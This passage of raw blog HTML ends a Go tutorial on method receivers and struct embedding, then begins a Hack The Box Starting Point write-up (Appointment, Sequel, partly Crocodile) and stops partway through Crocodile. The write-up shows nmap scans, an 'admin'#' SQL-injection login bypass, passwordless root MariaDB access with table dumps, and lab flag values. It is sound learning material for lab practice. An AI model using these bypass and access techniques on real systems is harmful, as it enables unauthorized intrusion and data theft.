class="hljs-number">18</span>)<br>p1.Dream()<br>&#125;<br>&gt;&gt;<br>hhah<br></code></pre></td></tr></table></figure><h3 id="指针类型的接收者"><a href="#指针类型的接收者" class="headerlink" title="指针类型的接收者"></a>指针类型的接收者</h3><p>由于指针的特性，调用方法时修改接收者指针的任意成员变量，方法结束后修改也有效。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *Person)</span></span> SetAge(newAge <span class="hljs-type">int8</span>) &#123;<br>p.age = newAge<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>p1 := NewPerson(<span class="hljs-string">&quot;cc&quot;</span>, <span class="hljs-number">18</span>)<br>fmt.Println(p1.age)<br>p1.SetAge(<span class="hljs-number">20</span>)<br>fmt.Println(p1.age)<br>&#125;<br>&gt;&gt;<br><span class="hljs-number">18</span><br><span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p>一般需要修改接收者中的值或者如果某个方法使用了指针接收者时用指针类型接收者</p><h3 id="值类型的接收者"><a href="#值类型的接收者" class="headerlink" title="值类型的接收者"></a>值类型的接收者</h3><p>当方法用于值类型接收者时，会在代码运行时将值复制一份。在值类型接收者的方法中可以获取接收者的成员值，但无法改变接收者本身</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p Person)</span></span> SetAge(newAge <span class="hljs-type">int8</span>) &#123;<br>p.age = newAge<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p Person)</span></span> Dream() &#123;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>p1 := NewPerson(<span class="hljs-string">&quot;hhah&quot;</span>, <span class="hljs-number">18</span>)<br>p1.Dream()<br>fmt.Println(p1.age)<br>p1.SetAge(<span class="hljs-number">20</span>)<br>fmt.Println(p1.age)<br>&#125;<br>&gt;&gt;<br><span class="hljs-number">18</span><br><span class="hljs-number">18</span><br></code></pre></td></tr></table></figure><h3 id="任意类型添加方法"><a href="#任意类型添加方法" class="headerlink" title="任意类型添加方法"></a>任意类型添加方法</h3><p>接收者可以是任意类型，不仅仅是结构体，任何类型都可以拥有方法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> MyInt <span class="hljs-type">int</span><span class="hljs-comment">//将 int 定义为 MyInt 类型</span><br><br><span class="hljs-comment">//为 MyInt 添加一个 SayHello 方法</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(m MyInt)</span></span> SayHello() &#123;<br>fmt.Println(<span class="hljs-string">&quot;hello&quot;</span>)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> m1 MyInt<br>m1.SayHello()<br>m1 = <span class="hljs-number">100</span><br>fmt.Printf(<span class="hljs-string">&quot;%#v %T\n&quot;</span>, m1, m1)<br>&#125;<br>&gt;&gt;<br>hello<br><span class="hljs-number">100</span> main.MyInt<br></code></pre></td></tr></table></figure><p><strong>不能给别的包的类型定义方法</strong></p><h2 id="嵌套"><a href="#嵌套" class="headerlink" title="嵌套"></a>嵌套</h2><p>一个结构体可以嵌套另一个结构体或结构体指针</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Address <span class="hljs-keyword">struct</span> &#123;<br>Province <span class="hljs-type">string</span><br>city     <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> &#123;<br>Name    <span class="hljs-type">string</span><br>Gender  <span class="hljs-type">string</span><br>Address Address<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>user1 := User&#123;<br>Name:   <span class="hljs-string">&quot;hhah&quot;</span>,<br>Gender: <span class="hljs-string">&quot;w&quot;</span>,<br>Address: Address&#123;<br>Province: <span class="hljs-string">&quot;四川&quot;</span>,<br>city:     <span class="hljs-string">&quot;成都&quot;</span>,<br>&#125;,<br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;user1=%#v\n&quot;</span>, user1)<br>&#125;<br>&gt;&gt;<br>user1=main.User&#123;Name:<span class="hljs-string">&quot;hhah&quot;</span>, Gender:<span class="hljs-string">&quot;w&quot;</span>, Address:main.Address&#123;Province:<span class="hljs-string">&quot;四川&quot;</span>, city:<span class="hljs-string">&quot;成都&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><h3 id="嵌套匿名结构体"><a href="#嵌套匿名结构体" class="headerlink" title="嵌套匿名结构体"></a>嵌套匿名结构体</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Address <span class="hljs-keyword">struct</span> &#123;<br>Province <span class="hljs-type">string</span><br>city     <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> &#123;<br>Name   <span class="hljs-type">string</span><br>Gender <span class="hljs-type">string</span><br>Address<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> user2 User<br>user2.Name = <span class="hljs-string">&quot;cc&quot;</span><br>user2.Gender = <span class="hljs-string">&quot;w&quot;</span><br>user2.Address.Province = <span class="hljs-string">&quot;四川&quot;</span><br>user2.city = <span class="hljs-string">&quot;成都&quot;</span><br>fmt.Printf(<span class="hljs-string">&quot;user2=%#v\n&quot;</span>, user2)<br>&#125;<br>&gt;&gt;<br>user2=main.User&#123;Name:<span class="hljs-string">&quot;cc&quot;</span>, Gender:<span class="hljs-string">&quot;w&quot;</span>, Address:main.Address&#123;Province:<span class="hljs-string">&quot;四川&quot;</span>, city:<span class="hljs-string">&quot;成都&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="内存对齐"><a href="#内存对齐" class="headerlink" title="内存对齐"></a>内存对齐</h2><p>结构体字段的内存分布遵循内存对齐的规则</p>]]></content>
    
    
    <categories>
      
      <category>Go</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-StartingPoint</title>
    <link href="/2025/03/06/StartingPoint/"/>
    <url>/2025/03/06/StartingPoint/</url>
    
    <content type="html"><![CDATA[<p>终于把 StartingPoint 打完了（累了）</p><span id="more"></span><h1 id="Tier-0"><a href="#Tier-0" class="headerlink" title="Tier 0"></a>Tier 0</h1><p>比较简单就没写</p><h1 id="Tier-1"><a href="#Tier-1" class="headerlink" title="Tier 1"></a>Tier 1</h1><h2 id="Appoinment"><a href="#Appoinment" class="headerlink" title="Appoinment"></a>Appoinment</h2><h3 id="Task-1"><a href="#Task-1" class="headerlink" title="Task  1"></a>Task  1</h3><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">What</span> <span class="hljs-variable">does</span> <span class="hljs-variable">the</span> <span class="hljs-variable">acronym</span> <span class="hljs-variable">SQL</span> <span class="hljs-variable">stand</span> <span class="hljs-variable">for</span><span class="hljs-operator">?</span><br><span class="hljs-operator">:</span><span class="hljs-variable">Structured</span> <span class="hljs-built_in">Query</span> <span class="hljs-built_in">Language</span><br></code></pre></td></tr></table></figure><h3 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> one <span class="hljs-keyword">of</span> the most common <span class="hljs-keyword">type</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">SQL</span> vulnerabilities?<br>:<span class="hljs-keyword">SQL</span> injection<br></code></pre></td></tr></table></figure><h3 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3"></a>Task 3</h3><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">What <span class="hljs-keyword">is</span> the <span class="hljs-number">2021</span> OWASP Top <span class="hljs-number">10</span> classification <span class="hljs-keyword">for</span> <span class="hljs-keyword">this</span> vulnerability?<br>:A03:<span class="hljs-number">2021</span>-Injection<br></code></pre></td></tr></table></figure><h3 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cmd">┌──(root㉿butt3rf1y)-[/home/butt3rf1y]<br>└─# nmap -sS -sV -Pn <span class="hljs-number">10</span>.<span class="hljs-number">129</span>.<span class="hljs-number">84</span>.<span class="hljs-number">247</span><br>Starting Nmap <span class="hljs-number">7</span>.<span class="hljs-number">94</span>SVN ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2025</span>-<span class="hljs-number">02</span>-<span class="hljs-number">19</span> <span class="hljs-number">00</span>:<span class="hljs-number">37</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10</span>.<span class="hljs-number">129</span>.<span class="hljs-number">84</span>.<span class="hljs-number">247</span><br>Host is up (<span class="hljs-number">0</span>.<span class="hljs-number">60</span>s latency).<br><span class="hljs-keyword">Not</span> shown: <span class="hljs-number">999</span> closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">38</span> ((Debian))<br><br>Service detection performed. Please report any incorrect results <span class="hljs-built_in">at</span> https://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">15</span>.<span class="hljs-number">07</span> seconds<br></code></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What <span class="hljs-keyword">does</span> Nmap report <span class="hljs-keyword">as</span> <span class="hljs-keyword">the</span> service <span class="hljs-keyword">and</span> <span class="hljs-built_in">version</span> <span class="hljs-keyword">that</span> are <span class="hljs-built_in">running</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">80</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> target?<br>: Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.38</span> ((Debian))<br></code></pre></td></tr></table></figure><h3 id="Task-5"><a href="#Task-5" class="headerlink" title="Task 5"></a>Task 5</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> standard port used <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> HTTPS protocol?<br>:<span class="hljs-number">443</span><br></code></pre></td></tr></table></figure><h3 id="Task-6"><a href="#Task-6" class="headerlink" title="Task 6"></a>Task 6</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">a</span> <span class="hljs-built_in">folder</span> called <span class="hljs-keyword">in</span> web-application terminology?<br>:<span class="hljs-built_in">directory</span><br></code></pre></td></tr></table></figure><h3 id="Task-7"><a href="#Task-7" class="headerlink" title="Task 7"></a>Task 7</h3><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">What <span class="hljs-keyword">is</span> the HTTP response code <span class="hljs-keyword">is</span> <span class="hljs-keyword">given</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;Not Found&#x27;</span> errors?<br>:<span class="hljs-number">404</span><br></code></pre></td></tr></table></figure><h3 id="Task-8"><a href="#Task-8" class="headerlink" title="Task 8"></a>Task 8</h3><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">Gobuster <span class="hljs-keyword">is</span> one tool used <span class="hljs-keyword">to</span> brute <span class="hljs-keyword">force</span> directories <span class="hljs-keyword">on</span> a webserver. What switch do we <span class="hljs-keyword">use</span> <span class="hljs-keyword">with</span> Gobuster <span class="hljs-keyword">to</span> specify we<span class="hljs-symbol">&#x27;re</span> looking <span class="hljs-keyword">to</span> discover directories, <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> subdomains?<br>:dir<br></code></pre></td></tr></table></figure><h3 id="Task-9"><a href="#Task-9" class="headerlink" title="Task 9"></a>Task 9</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What single <span class="hljs-keyword">character</span> can be used <span class="hljs-built_in">to</span> comment out <span class="hljs-keyword">the</span> rest <span class="hljs-keyword">of</span> <span class="hljs-keyword">a</span> <span class="hljs-built_in">line</span> <span class="hljs-keyword">in</span> MySQL?<br>:<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h3 id="Task-10"><a href="#Task-10" class="headerlink" title="Task 10"></a>Task 10</h3><p>直接访问 80 端口，一个登录框输入 <code>admin&#39;#</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">If</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">input</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> handled carefully, it could be interpreted <span class="hljs-keyword">as</span> a <span class="hljs-keyword">comment</span>. Use a <span class="hljs-keyword">comment</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">login</span> <span class="hljs-keyword">as</span> <span class="hljs-keyword">admin</span> <span class="hljs-keyword">without</span> knowing the <span class="hljs-keyword">password</span>. What <span class="hljs-keyword">is</span> the first word <span class="hljs-keyword">on</span> the webpage returned?<br>:Congratulations!<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag"><a href="#Submit-Flag" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">Submit</span> root flag<br>:e3d0796d002a446c0e622226f42e9672<br></code></pre></td></tr></table></figure><h2 id="Sequel"><a href="#Sequel" class="headerlink" title="Sequel"></a>Sequel</h2><h3 id="Task-1-1"><a href="#Task-1-1" class="headerlink" title="Task 1"></a>Task 1</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">During our scan, which<span class="hljs-built_in"> port </span><span class="hljs-keyword">do</span> we <span class="hljs-built_in">find</span> serving MySQL?<br>:3306<br></code></pre></td></tr></table></figure><h3 id="Task-2-1"><a href="#Task-2-1" class="headerlink" title="Task 2"></a>Task 2</h3><p>扫了半天扫不出来，准确来说扫不动，一扫就卡，可以直接连接</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿butt3rf1y)-[/home/butt3rf1y]<br>└─# mysql -h <span class="hljs-number">10.129</span><span class="hljs-number">.141</span><span class="hljs-number">.247</span> -P <span class="hljs-number">3306</span> -uroot<br><span class="hljs-built_in">WARNING</span>: <span class="hljs-keyword">option</span> <span class="hljs-comment">--ssl-verify-server-cert is disabled, because of an insecure passwordless login.</span><br>Welcome <span class="hljs-keyword">to</span> the MariaDB monitor.  Commands <span class="hljs-keyword">end</span> <span class="hljs-keyword">with</span> ; <span class="hljs-keyword">or</span> \g.<br>Your MariaDB <span class="hljs-keyword">connection</span> id <span class="hljs-keyword">is</span> <span class="hljs-number">63</span><br><span class="hljs-keyword">Server</span> <span class="hljs-keyword">version</span>: <span class="hljs-number">10.3</span><span class="hljs-number">.27</span>-MariaDB<span class="hljs-number">-0</span>+deb10u1 Debian <span class="hljs-number">10</span><br><br>Copyright (c) <span class="hljs-number">2000</span>, <span class="hljs-number">2018</span>, Oracle, MariaDB Corporation Ab <span class="hljs-keyword">and</span> others.<br><br>Support MariaDB developers <span class="hljs-keyword">by</span> giving a star at https://github.com/MariaDB/<span class="hljs-keyword">server</span><br><span class="hljs-keyword">Type</span> <span class="hljs-string">&#x27;help;&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;\h&#x27;</span> <span class="hljs-keyword">for</span> help. <span class="hljs-keyword">Type</span> <span class="hljs-string">&#x27;\c&#x27;</span> <span class="hljs-keyword">to</span> clear the <span class="hljs-keyword">current</span> <span class="hljs-keyword">input</span> <span class="hljs-keyword">statement</span>.<br><br>MariaDB [(<span class="hljs-keyword">none</span>)]&gt;<br></code></pre></td></tr></table></figure><p>可以看到是 <code>MariaDB</code></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What community-developed MySQL <span class="hljs-built_in">version</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> target <span class="hljs-built_in">running</span>?<br>:MariaDB<br></code></pre></td></tr></table></figure><h3 id="Task-3-1"><a href="#Task-3-1" class="headerlink" title="Task 3"></a>Task 3</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">When</span> <span class="hljs-keyword">using</span> the MySQL command <span class="hljs-type">line</span> client, what switch <span class="hljs-keyword">do</span> we need <span class="hljs-keyword">to</span> use <span class="hljs-keyword">in</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">to</span> specify a <span class="hljs-keyword">login</span> username?<br>:-u<br></code></pre></td></tr></table></figure><h3 id="Task-4-1"><a href="#Task-4-1" class="headerlink" title="Task 4"></a>Task 4</h3><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">Which username allows us to log into this MariaDB<span class="hljs-built_in"> instance </span>without providing a password?<span class="hljs-keyword"></span><br><span class="hljs-keyword">:root</span><br></code></pre></td></tr></table></figure><h3 id="Task-5-1"><a href="#Task-5-1" class="headerlink" title="Task 5"></a>Task 5</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">In SQL, what <span class="hljs-selector-tag">symbol</span> can we <span class="hljs-selector-tag">use</span> <span class="hljs-selector-tag">to</span> specify within the query that we want <span class="hljs-selector-tag">to</span> <span class="hljs-attribute">display</span> everything inside <span class="hljs-selector-tag">a</span> <span class="hljs-selector-tag">table</span>?<br>:*<br></code></pre></td></tr></table></figure><h3 id="Task-6-1"><a href="#Task-6-1" class="headerlink" title="Task 6"></a>Task 6</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">In</span> <span class="hljs-keyword">SQL</span>, what symbol <span class="hljs-keyword">do</span> we need <span class="hljs-keyword">to</span> <span class="hljs-keyword">end</span> <span class="hljs-keyword">each</span> query <span class="hljs-keyword">with</span>?<br>:;<br></code></pre></td></tr></table></figure><h3 id="Task-7-1"><a href="#Task-7-1" class="headerlink" title="Task 7"></a>Task 7</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">MariaDB [(none)]&gt; show databases;<br><span class="hljs-code">+--------------------+</span><br><span class="hljs-section">| Database           |</span><br><span class="hljs-section">+--------------------+</span><br>| htb                |<br>| information<span class="hljs-emphasis">_schema |</span><br><span class="hljs-emphasis">| mysql              |</span><br><span class="hljs-emphasis">| performance_</span>schema |<br><span class="hljs-code">+--------------------+</span><br>4 rows in set (0.353 sec)<br></code></pre></td></tr></table></figure><p>使用 <code>show databases;</code>查看数据库</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">There are three databases in this MySQL<span class="hljs-built_in"> instance </span>that are common across all MySQL instances. What is the name of the fourth that&#x27;s unique to this host?<span class="hljs-keyword"></span><br><span class="hljs-keyword">:htb</span><br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-1"><a href="#Submit-Flag-1" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p><code>information_schema，mysql，performance_schema</code> 这几个数据库是 MySQL 自带的，一般来说是四个默认库，还有一个 <code>sys</code> 库。所以我们查找东西也是从 <code>htb</code> &#96; 查找</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">MariaDB [(none)]&gt; use htb<br>Reading table information for completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br>MariaDB [htb]&gt; show tables;<br>+---------------+<br>|<span class="hljs-string"> Tables_in_htb </span>|<br>+---------------+<br>|<span class="hljs-string"> config        </span>|<br>|<span class="hljs-string"> users         </span>|<br>+---------------+<br>2 rows in set (0.335 sec)<br><br>MariaDB [htb]&gt; select <span class="hljs-symbol">*</span> from config;<br>+----+-----------------------+----------------------------------+<br>|<span class="hljs-string"> id </span>|<span class="hljs-string"> name                  </span>|<span class="hljs-string"> value                            </span>|<br>+----+-----------------------+----------------------------------+<br>|<span class="hljs-string">  1 </span>|<span class="hljs-string"> timeout               </span>|<span class="hljs-string"> 60s                              </span>|<br>|<span class="hljs-string">  2 </span>|<span class="hljs-string"> security              </span>|<span class="hljs-string"> default                          </span>|<br>|<span class="hljs-string">  3 </span>|<span class="hljs-string"> auto_logon            </span>|<span class="hljs-string"> false                            </span>|<br>|<span class="hljs-string">  4 </span>|<span class="hljs-string"> max_size              </span>|<span class="hljs-string"> 2M                               </span>|<br>|<span class="hljs-string">  5 </span>|<span class="hljs-string"> flag                  </span>|<span class="hljs-string"> 7b4bec00d1a39e3dd4e021ec3d915da8 </span>|<br>|<span class="hljs-string">  6 </span>|<span class="hljs-string"> enable_uploads        </span>|<span class="hljs-string"> false                            </span>|<br>|<span class="hljs-string">  7 </span>|<span class="hljs-string"> authentication_method </span>|<span class="hljs-string"> radius                           </span>|<br>+----+-----------------------+----------------------------------+<br>7 rows in set (0.332 sec)<br></code></pre></td></tr></table></figure><p>简单的 sql 查询语句查询</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">Submit</span> root flag<br>:<span class="hljs-number">7</span>b4bec00d1a39e3dd4e021ec3d915da8<br></code></pre></td></tr></table></figure><h2 id="Crocodile"><a href="#Crocodile" class="headerlink" title="Crocodile"></a>Crocodile</h2><h3 id="Task-1-2"><a href="#Task-1-2" class="headerlink" title="Task 1"></a>Task 1</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">What Nmap <span class="hljs-keyword">scanning </span><span class="hljs-keyword">switch </span>employs the use of default <span class="hljs-keyword">scripts </span>during a <span class="hljs-keyword">scan?</span><br><span class="hljs-keyword"></span>:-<span class="hljs-keyword">sC</span><br></code></pre></td></tr></table></figure><h3 id="Task-2-2"><a href="#Task-2-2" class="headerlink" title="Task 2"></a>Task 2</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">┌──(root㉿butt3rf1y)-[/home/butt3rf1y]<br>└─<span class="hljs-comment"># nmap -sS -sV -Pn 10.129.1.15</span><br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( <span class="hljs-keyword">https</span>://nmap.org ) <span class="hljs-keyword">at</span> <span class="hljs-number">2025</span><span class="hljs-number">-02</span><span class="hljs-number">-19</span> <span class="hljs-number">01</span>:<span class="hljs-number">18</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span><span class="hljs-number">.1</span><span class="hljs-number">.15</span><br>Host is up (<span class="hljs-number">0.95</span>s latency).<br>Not shown: <span class="hljs-number">998</span> closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">21</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">ftp</span>     vsftpd <span class="hljs-number">3.0</span><span class="hljs-number">.3</span><br><span class="hljs-number">80</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>    Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.41</span> ((Ubuntu))<br>Service Info: OS: Unix<br></code></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What service <span class="hljs-built_in">version</span> <span class="hljs-keyword">is</span> found <span class="hljs-keyword">to</span> be <span class="hljs-built_in">running</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">21</span>?<br>:vsftpd <span class="hljs-number">3.0</span><span class="hljs-number">.3</span><br></code></pre></td></tr></table></figure><h3 id="Task-3-2"><a href="#Task-3-2" class="headerlink" title="Task 3"></a>Task 3</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 